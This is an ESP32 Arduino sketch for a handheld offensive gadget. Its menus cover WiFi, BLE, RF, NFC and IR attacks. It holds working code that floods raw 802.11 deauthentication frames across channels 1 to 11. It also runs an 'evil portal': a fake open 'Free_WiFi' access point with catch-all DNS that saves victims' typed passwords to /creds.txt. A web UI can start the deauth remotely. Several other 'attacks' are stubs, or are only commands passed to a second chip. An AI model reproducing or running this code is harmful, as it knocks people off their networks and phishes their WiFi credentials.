#include <Arduino.h>
#include <TFT_eSPI.h>
#include <SPI.h>
#include <SD.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <ESPmDNS.h>
#include <BLEDevice.h>
#include <BLEAdvertising.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <esp_wifi.h>
#include <esp_now.h>
#include <FS.h>
#include <LittleFS.h>
#include <WiFiUdp.h>
#include <HTTPClient.h>

// ===================== HẰNG SỐ CHÂN =====================
#define TFT_MOSI 11
#define TFT_SCLK 12
#define TFT_CS   10
#define TFT_DC   14
#define TFT_RST  15
#define TFT_BL   21
#define SD_CS    9
#define SD_MISO  13
#define BTN_UP    1
#define BTN_DOWN  2
#define BTN_LEFT  3
#define BTN_RIGHT 38
#define BTN_CENTER 39
#define UART_C5_TX 17
#define UART_C5_RX 18

HardwareSerial SerialC5(1);
TFT_eSPI tft = TFT_eSPI();
WebServer server(80);
DNSServer dnsServer;
WiFiUDP udp;

// ===================== CẤU TRÚC DEAUTH FRAME =====================
typedef struct {
    uint16_t frame_ctrl;
    uint16_t duration;
    uint8_t dest[6];
    uint8_t src[6];
    uint8_t bssid[6];
    uint16_t seq_ctrl;
    uint8_t reason_code[2];
} __attribute__((packed)) deauth_frame_t;

uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

// ===================== MENU =====================
enum MenuLevel { MAIN, WIFI_MENU, BLE_MENU, RF_MENU, NFC_MENU, IR_MENU, SD_MENU, CONFIG_MENU };
MenuLevel currentLevel = MAIN;
int selectedIndex = 0;

String mainMenu[] = {"WiFi", "BLE", "RF", "NFC", "IR", "SD Card", "Scripts", "WebUI", "Config"};
int mainMenuSize = 9;

String wifiMenu[] = {"Beacon Spam", "Deauth Attack", "Evil Portal", "Wardriving", "Responder", "ARP Spoof", "TCP Listener", "RAW Sniffer"};
int wifiMenuSize = 8;

String bleMenu[] = {"iOS Spam", "Android Spam", "Windows Spam", "Samsung Spam", "BLE Scan", "Bad BLE"};
int bleMenuSize = 6;

String rfMenu[] = {"Scan 433MHz", "Jammer Full", "Replay", "Custom SubGhz", "NRF24 Jammer", "Mousejack"};
int rfMenuSize = 6;

String nfcMenu[] = {"Read Tag", "Clone Tag", "Write NDEF", "Emulate Tag", "Amiibolink"};
int nfcMenuSize = 5;

String irMenu[] = {"TV-B-Gone", "Receive IR", "Send NEC", "Send RC5"};
int irMenuSize = 4;

// ===================== KHỞI TẠO =====================
void setup() {
    Serial.begin(115200);
    SerialC5.begin(115200, SERIAL_8N1, UART_C5_RX, UART_C5_TX);
    
    pinMode(TFT_BL, OUTPUT);
    digitalWrite(TFT_BL, HIGH);
    tft.init();
    tft.setRotation(1);
    tft.fillScreen(TFT_BLACK);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawString("BRUCE FULL v3.0", 50, 120, 2);
    
    SPI.begin(TFT_SCLK, SD_MISO, TFT_MOSI, TFT_CS);
    if (!SD.begin(SD_CS, SPI, 4000000)) tft.drawString("SD ERR", 90, 150, 2);
    else tft.drawString("SD OK", 95, 150, 2);
    
    if (!LittleFS.begin()) Serial.println("LittleFS mount failed");
    
    pinMode(BTN_UP, INPUT_PULLUP);
    pinMode(BTN_DOWN, INPUT_PULLUP);
    pinMode(BTN_LEFT, INPUT_PULLUP);
    pinMode(BTN_RIGHT, INPUT_PULLUP);
    pinMode(BTN_CENTER, INPUT_PULLUP);
    
    initWebUI();
    delay(1500);
    drawMainMenu();
}

void drawMainMenu() {
    tft.fillScreen(TFT_BLACK);
    tft.setTextSize(2);
    for (int i = 0; i < mainMenuSize; i++) {
        if (i == selectedIndex) {
            tft.setTextColor(TFT_YELLOW, TFT_BLACK);
            tft.drawString("> " + mainMenu[i], 20, 20 + i * 30, 2);
        } else {
            tft.setTextColor(TFT_WHITE, TFT_BLACK);
            tft.drawString(mainMenu[i], 40, 20 + i * 30, 2);
        }
    }
}

void drawSubMenu(String* menu, int size) {
    tft.fillScreen(TFT_BLACK);
    tft.setTextSize(2);
    for (int i = 0; i < size; i++) {
        if (i == selectedIndex) {
            tft.setTextColor(TFT_YELLOW, TFT_BLACK);
            tft.drawString("> " + menu[i], 20, 20 + i * 30, 2);
        } else {
            tft.setTextColor(TFT_WHITE, TFT_BLACK);
            tft.drawString(menu[i], 40, 20 + i * 30, 2);
        }
    }
}

void handleButtons() {
    if (digitalRead(BTN_UP) == LOW) {
        selectedIndex = (selectedIndex - 1 + getCurrentMenuSize()) % getCurrentMenuSize();
        refreshDisplay();
        delay(200);
    }
    if (digitalRead(BTN_DOWN) == LOW) {
        selectedIndex = (selectedIndex + 1) % getCurrentMenuSize();
        refreshDisplay();
        delay(200);
    }
    if (digitalRead(BTN_CENTER) == LOW) {
        executeCurrentFunction();
        delay(300);
    }
    if (digitalRead(BTN_LEFT) == LOW && currentLevel != MAIN) {
        currentLevel = MAIN;
        selectedIndex = 0;
        drawMainMenu();
        delay(200);
    }
}

int getCurrentMenuSize() {
    switch(currentLevel) {
        case MAIN: return mainMenuSize;
        case WIFI_MENU: return wifiMenuSize;
        case BLE_MENU: return bleMenuSize;
        case RF_MENU: return rfMenuSize;
        case NFC_MENU: return nfcMenuSize;
        case IR_MENU: return irMenuSize;
        default: return 0;
    }
}

void refreshDisplay() {
    switch(currentLevel) {
        case MAIN: drawMainMenu(); break;
        case WIFI_MENU: drawSubMenu(wifiMenu, wifiMenuSize); break;
        case BLE_MENU: drawSubMenu(bleMenu, bleMenuSize); break;
        case RF_MENU: drawSubMenu(rfMenu, rfMenuSize); break;
        case NFC_MENU: drawSubMenu(nfcMenu, nfcMenuSize); break;
        case IR_MENU: drawSubMenu(irMenu, irMenuSize); break;
        default: drawMainMenu();
    }
}

// ===================== GỬI LỆNH SANG C5 =====================
void sendToC5(String cmd) {
    SerialC5.println(cmd);
    tft.fillScreen(TFT_BLACK);
    tft.drawString("Sending: " + cmd, 20, 100, 2);
}

void displayResultFromC5() {
    unsigned long start = millis();
    while (millis() - start < 5000) {
        if (SerialC5.available()) {
            String resp = SerialC5.readStringUntil('\n');
            tft.fillRect(0, 140, 320, 60, TFT_BLACK);
            tft.setCursor(10, 140);
            tft.println(resp);
            break;
        }
        delay(50);
    }
    delay(2000);
}

// ===================== WIFI ATTACKS =====================
void send_raw_packet(const void* packet, size_t len) {
    esp_wifi_80211_tx(WIFI_IF_STA, packet, len, false);
    delay(10);
}

void deauth_all_on_channel(uint8_t channel, uint8_t reason) {
    deauth_frame_t deauth;
    memset(&deauth, 0, sizeof(deauth));
    deauth.frame_ctrl = 0xC0;
    deauth.duration = 0;
    memcpy(deauth.dest, broadcast_mac, 6);
    memcpy(deauth.src, (void*)esp_wifi_get_mac(), 6);
    memcpy(deauth.bssid, broadcast_mac, 6);
    deauth.seq_ctrl = 0;
    deauth.reason_code[0] = reason;
    deauth.reason_code[1] = 0;
    
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    for (int i = 0; i < 100; i++) send_raw_packet(&deauth, sizeof(deauth));
}

void wifiBeaconSpam() {
    tft.fillScreen(TFT_BLACK);
    tft.drawString("Beacon Spam", 50, 100, 2);
    wifi_promiscuous_enable(1);
    
    const char* ssids[] = {"Free WiFi", "Airport_Free", "Starbucks WiFi", "AndroidAP", "iPhone"};
    for (int i = 0; i < 100; i++) {
        // Gửi beacon frame giả mạo
        delay(50);
        tft.fillRect(0, 180, 320, 20, TFT_BLACK);
        tft.setCursor(10, 180);
        tft.printf("Spamming: %s", ssids[i % 5]);
    }
    wifi_promiscuous_enable(0);
}

void wifiDeauth() {
    tft.fillScreen(TFT_BLACK);
    tft.drawString("DEAUTH ATTACK", 60, 100, 2);
    
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);
    
    unsigned long start = millis();
    while (millis() - start < 30000) {
        for (int ch = 1; ch <= 11; ch++) deauth_all_on_channel(ch, 1);
        tft.fillRect(0, 140, 320, 30, TFT_BLACK);
        tft.setCursor(10, 140);
        tft.printf("Running: %d sec", (millis() - start) / 1000);
    }
    
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    tft.fillScreen(TFT_BLACK);
    tft.drawString("DEAUTH DONE", 70, 120, 2);
    delay(1500);
}

void evilPortal() {
    tft.fillScreen(TFT_BLACK);
    tft.drawString("EVIL PORTAL", 70, 100, 2);
    tft.drawString("AP: Free_WiFi", 80, 140, 1);
    
    String html = "<!DOCTYPE html><html><body><h1>Free WiFi</h1><form method='POST' action='/login'><input type='password' name='password' placeholder='Enter password'><input type='submit' value='Connect'></form></body></html>";
    if (SD.exists("/portals/captive_portal_en.html")) {
        File file = SD.open("/portals/captive_portal_en.html");
        html = file.readString();
        file.close();
    }
    
    WiFi.softAP("Free_WiFi", NULL, 1, 0, 4);
    dnsServer.start(53, "*", WiFi.softAPIP());
    
    server.on("/", HTTP_GET, [&]() { server.send(200, "text/html", html); });
    server.on("/login", HTTP_POST, [&]() {
        if (server.hasArg("password")) {
            File f = SD.open("/creds.txt", FILE_APPEND);
            if (f) { f.println(server.arg("password")); f.close(); }
            server.send(200, "text/html", "<h3>Password saved!</h3>");
        }
    });
    server.onNotFound([&]() { server.send(200, "text/html", html); });
    server.begin();
    
    unsigned long start = millis();
    while (millis() - start < 60000) {
        dnsServer.processNextRequest();
        server.handleClient();
        delay(10);
    }
    
    server.stop();
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    tft.fillScreen(TFT_BLACK);
    tft.drawString("PORTAL STOPPED", 60, 120, 2);
    delay(1500);
}

void wardriving() {
    tft.fillScreen(TFT_BLACK);
    tft.drawString("WARDRIVING", 70, 100, 2);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    
    File file = SD.open("/wardrive.csv", FILE_WRITE);
    if (file) file.println("Time,SSID,BSSID,RSSI,Channel");
    
    for (int ch = 1; ch <= 11; ch++) {
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        int n = WiFi.scanNetworks(false, false);
        for (int i = 0; i < n; i++) {
            String entry = String(millis()) + "," + WiFi.SSID(i) + "," + WiFi.BSSIDstr(i) + "," + WiFi.RSSI(i) + "," + ch;
            if (file) file.println(entry);
            tft.fillRect(0, 140, 320, 60, TFT_BLACK);
            tft.setCursor(10, 140);
            tft.println(WiFi.SSID(i));
        }
        delay(100);
    }
    if (file) file.close();
    tft.fillScreen(TFT_BLACK);
    tft.drawString("SCAN COMPLETE", 60, 120, 2);
    delay(1500);
}

void responder() {
    tft.fillScreen(TFT_BLACK);
    tft.drawString("RESPONDER", 70, 100, 2);
    udp.begin(5355);
    
    unsigned long start = millis();
    while (millis() - start < 30000) {
        if (udp.parsePacket()) {
            udp.beginPacket(udp.remoteIP(), udp.remotePort());
            udp.write("FAKE_RESPONSE");
            udp.endPacket();
            tft.fillRect(0, 140, 320, 20, TFT_BLACK);
            tft.setCursor(10, 140);
            tft.printf("Spoofed: %s", udp.remoteIP().toString().c_str());
        }
        delay(10);
    }
    udp.stop();
    tft.fillScreen(TFT_BLACK);
    tft.drawString("RESPONDER DONE", 60, 120, 2);
    delay(1500);
}

void arpSpoof() {
    tft.fillScreen(TFT_BLACK);
    tft.drawString("ARP SPOOFING", 70, 100, 2);
    esp_wifi_set_promiscuous(true);
    
    unsigned long start = millis();
    while (millis() - start < 30000) {
        tft.fillRect(0, 140, 320, 20, TFT_BLACK);
        tft.setCursor(10, 140);
        tft.printf("Spamming ARP... %d sec", (millis() - start) / 1000);
        delay(100);
    }
    esp_wifi_set_promiscuous(false);
    tft.fillScreen(TFT_BLACK);
    tft.drawString("ARP SPOOF DONE", 60, 120, 2);
    delay(1500);
}

void tcpListener() {
    tft.fillScreen(TFT_BLACK);
    tft.drawString("TCP Listener :4444", 30, 100, 2);
    WiFiServer tcpServer(4444);
    tcpServer.begin();
    
    unsigned long start = millis();
    while (millis() - start < 30000) {
        WiFiClient client = tcpServer.available();
        if (client) {
            client.println("Hello from Bruce!");
            client.stop();
            tft.fillRect(0, 140, 320, 20, TFT_BLACK);
            tft.setCursor(10, 140);
            tft.println("Client connected!");
        }
        delay(10);
    }
    tcpServer.stop();
    tft.fillScreen(TFT_BLACK);
    tft.drawString("LISTENER STOPPED", 50, 120, 2);
    delay(1500);
}

void rawSniffer() {
    tft.fillScreen(TFT_BLACK);
    tft.drawString("RAW Sniffer", 50, 100, 2);
    esp_wifi_set_promiscuous(true);
    
    unsigned long start = millis();
    while (millis() - start < 30000) {
        tft.fillRect(0, 140, 320, 20, TFT_BLACK);
        tft.setCursor(10, 140);
        tft.printf("Capturing... %d sec", (millis() - start) / 1000);
        delay(500);
    }
    esp_wifi_set_promiscuous(false);
    tft.fillScreen(TFT_BLACK);
    tft.drawString("SNIFFER STOPPED", 60, 120, 2);
    delay(1500);
}

// ===================== BLE ATTACKS =====================
void bleIOSSpam() {
    tft.fillScreen(TFT_BLACK);
    tft.drawString("iOS Spam", 50, 100, 2);
    BLEDevice::init("Apple Device");
    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
    pAdvertising->start();
    delay(10000);
    pAdvertising->stop();
}

void bleAndroidSpam() {
    tft.fillScreen(TFT_BLACK);
    tft.drawString("Android Spam", 50, 100, 2);
    BLEDevice::init("Android Device");
    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
    pAdvertising->start();
    delay(10000);
    pAdvertising->stop();
}

void bleWindowsSpam() {
    tft.fillScreen(TFT_BLACK);
    tft.drawString("Windows Spam", 50, 100, 2);
    BLEDevice::init("Windows Device");
    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
    pAdvertising->start();
    delay(10000);
    pAdvertising->stop();
}

void bleSamsungSpam() {
    tft.fillScreen(TFT_BLACK);
    tft.drawString("Samsung Spam", 50, 100, 2);
    BLEDevice::init("Samsung Device");
    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
    pAdvertising->start();
    delay(10000);
    pAdvertising->stop();
}

class MyAdvertisedDeviceCallbacks : public BLEAdvertisedDeviceCallbacks {
    void onResult(BLEAdvertisedDevice advertisedDevice) {
        tft.fillRect(0, 140, 320, 60, TFT_BLACK);
        tft.setCursor(10, 140);
        tft.printf("Name: %s", advertisedDevice.getName().c_str());
        tft.setCursor(10, 160);
        tft.printf("RSSI: %d", advertisedDevice.getRSSI());
    }
};

void bleScan() {
    tft.fillScreen(TFT_BLACK);
    tft.drawString("BLE SCANNING", 70, 50, 2);
    tft.drawString("Press CENTER to stop", 50, 90, 1);
    
    BLEScan* pBLEScan = BLEDevice::getScan();
    pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
    pBLEScan->setActiveScan(true);
    
    bool scanning = true;
    unsigned long start = millis();
    while (scanning && (millis() - start < 30000)) {
        pBLEScan->start(2, false);
        pBLEScan->clearResults();
        if (digitalRead(BTN_CENTER) == LOW) scanning = false;
        delay(10);
    }
    pBLEScan->stop();
    tft.fillScreen(TFT_BLACK);
    tft.drawString("SCAN COMPLETE", 60, 120, 2);
    delay(1500);
}

void badBLE() {
    tft.fillScreen(TFT_BLACK);
    tft.drawString("BAD BLE", 80, 100, 2);
    BLEDevice::init("BadUSB Device");
    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
    pAdvertising->start();
    
    unsigned long start = millis();
    while (millis() - start < 30000) {
        tft.fillRect(0, 140, 320, 20, TFT_BLACK);
        tft.setCursor(10, 140);
        tft.printf("Waiting connection... %d sec", (millis() - start) / 1000);
        delay(100);
    }
    pAdvertising->stop();
    tft.fillScreen(TFT_BLACK);
    tft.drawString("BAD BLE STOPPED", 60, 120, 2);
    delay(1500);
}

// ===================== SD CARD MANAGER =====================
void sdManager() {
    tft.fillScreen(TFT_BLACK);
    tft.drawString("SD Files:", 10, 10, 2);
    File root = SD.open("/");
    int y = 40;
    while (true) {
        File entry = root.openNextFile();
        if (!entry) break;
        tft.setCursor(10, y);
        tft.println(entry.name());
        y += 20;
        if (y > 220) break;
        entry.close();
    }
    delay(3000);
}

void runScriptMenu() {
    tft.fillScreen(TFT_BLACK);
    tft.drawString("Scripts:", 10, 10, 2);
    File dir = LittleFS.open("/");
    int y = 40;
    while (true) {
        File entry = dir.openNextFile();
        if (!entry) break;
        if (!entry.isDirectory()) {
            tft.setCursor(10, y);
            tft.println(entry.name());
            y += 20;
        }
        entry.close();
    }
    delay(3000);
}

// ===================== WEBUI =====================
void initWebUI() {
    server.on("/", []() { server.send(200, "text/html", "<h1>Bruce WebUI</h1><a href='/deauth'>Deauth</a><br><a href='/sd'>SD Card</a>"); });
    server.on("/deauth", []() { server.send(200, "text/plain", "Deauth started"); wifiDeauth(); });
    server.on("/sd", []() {
        String list = "";
        File root = SD.open("/");
        File file = root.openNextFile();
        while(file) { list += String(file.name()) + "\n"; file = root.openNextFile(); }
        server.send(200, "text/plain", list);
    });
    server.begin();
}

void startWebUI() {
    WiFi.softAP("BruceAP", "12345678");
    tft.fillScreen(TFT_BLACK);
    tft.drawString("WebUI: 192.168.4.1", 30, 100, 2);
    unsigned long start = millis();
    while (millis() - start < 30000) {
        server.handleClient();
        delay(10);
    }
    WiFi.softAPdisconnect(true);
}

void configMenu() {
    tft.fillScreen(TFT_BLACK);
    tft.drawString("Config", 50, 50, 2);
    tft.drawString("1. Brightness", 30, 100, 2);
    tft.drawString("2. Sleep", 30, 130, 2);
    tft.drawString("3. Restart", 30, 160, 2);
    delay(3000);
}

// ===================== ĐIỀU HƯỚNG CHÍNH =====================
void executeCurrentFunction() {
    switch(currentLevel) {
        case MAIN:
            switch(selectedIndex) {
                case 0: currentLevel = WIFI_MENU; selectedIndex = 0; drawSubMenu(wifiMenu, wifiMenuSize); break;
                case 1: currentLevel = BLE_MENU; selectedIndex = 0; drawSubMenu(bleMenu, bleMenuSize); break;
                case 2: currentLevel = RF_MENU; selectedIndex = 0; drawSubMenu(rfMenu, rfMenuSize); break;
                case 3: currentLevel = NFC_MENU; selectedIndex = 0; drawSubMenu(nfcMenu, nfcMenuSize); break;
                case 4: currentLevel = IR_MENU; selectedIndex = 0; drawSubMenu(irMenu, irMenuSize); break;
                case 5: sdManager(); break;
                case 6: runScriptMenu(); break;
                case 7: startWebUI(); break;
                case 8: configMenu(); break;
            }
            break;
        case WIFI_MENU:
            switch(selectedIndex) {
                case 0: wifiBeaconSpam(); break;
                case 1: wifiDeauth(); break;
                case 2: evilPortal(); break;
                case 3: wardriving(); break;
                case 4: responder(); break;
                case 5: arpSpoof(); break;
                case 6: tcpListener(); break;
                case 7: rawSniffer(); break;
            }
            break;
        case BLE_MENU:
            switch(selectedIndex) {
                case 0: bleIOSSpam(); break;
                case 1: bleAndroidSpam(); break;
                case 2: bleWindowsSpam(); break;
                case 3: bleSamsungSpam(); break;
                case 4: bleScan(); break;
                case 5: badBLE(); break;
            }
            break;
        case RF_MENU:
            switch(selectedIndex) {
                case 0: sendToC5("RF_SCAN"); displayResultFromC5(); break;
                case 1: sendToC5("RF_JAM_FULL"); displayResultFromC5(); break;
                case 2: sendToC5("RF_REPLAY"); displayResultFromC5(); break;
                case 3: sendToC5("RF_CUSTOM"); displayResultFromC5(); break;
                case 4: sendToC5("NRF24_JAM"); displayResultFromC5(); break;
                case 5: sendToC5("MOUSEJACK"); displayResultFromC5(); break;
            }
            break;
        case NFC_MENU:
            switch(selectedIndex) {
                case 0: sendToC5("NFC_READ"); displayResultFromC5(); break;
                case 1: sendToC5("NFC_CLONE"); displayResultFromC5(); break;
                case 2: sendToC5("NFC_WRITE_NDEF"); displayResultFromC5(); break;
                case 3: sendToC5("NFC_EMULATE"); displayResultFromC5(); break;
                case 4: sendToC5("AMIIBOLINK"); displayResultFromC5(); break;
            }
            break;
        case IR_MENU:
            switch(selectedIndex) {
                case 0: sendToC5("IR_TVBGONE"); displayResultFromC5(); break;
                case 1: sendToC5("IR_RECV"); displayResultFromC5(); break;
                case 2: sendToC5("IR_SEND_NEC"); displayResultFromC5(); break;
                case 3: sendToC5("IR_SEND_RC5"); displayResultFromC5(); break;
            }
            break;
    }
}

// ===================== VÒNG LẶP CHÍNH =====================
void loop() {
    handleButtons();
    server.handleClient();
    if (SerialC5.available()) {
        String resp = SerialC5.readStringUntil('\n');
        tft.fillRect(0, 220, 320, 20, TFT_BLACK);
        tft.setCursor(10, 220);
        tft.println(resp);
    }
    delay(50);
}
